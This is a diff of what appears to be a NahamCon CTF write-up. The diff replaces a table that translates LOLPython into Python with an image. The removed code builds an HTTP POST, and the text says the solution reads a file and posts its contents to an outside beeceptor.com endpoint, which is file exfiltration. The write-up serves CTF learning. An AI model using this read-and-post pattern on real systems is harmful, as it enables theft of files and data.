@@ -76,15 +76,7 @@ VISIBLE R OWN read THING
 
 OK strap in, here we go (skipping the file reading we've already covered in part 1):
 
-| LOLPython         | python     |
-|--------------|-----------|
-| `GIMME httplib` | `import httplib` |
-| `H CAN HAS INVISIBLE BUCKET` | `H = {}` |
-| `H LET THE "Content-type" OK CAN HAS "text/plain"` | H["Content-type"] = "text/plain"` |
-| `C CAN HAS httplib OWN HTTPConnection WIT U!` | `C = httplib.HTTPConnection(U)` |
-| `C OWN request WIT "POST" AND "/test" AND S AND H!` | `C.request("POST", "/test", S, H)` |
-| `R CAN HAS C OWN getresponse THING` | `R = C.getresponse()`|
-
+![lold2 explanation]({{ site.url }}/assets/post-images/nahamcon-lold/lolpython2-to-python.png)
 
 So in short we read the file contents, then post it to `http://blarg.free.beeceptor.com:/test`.
 
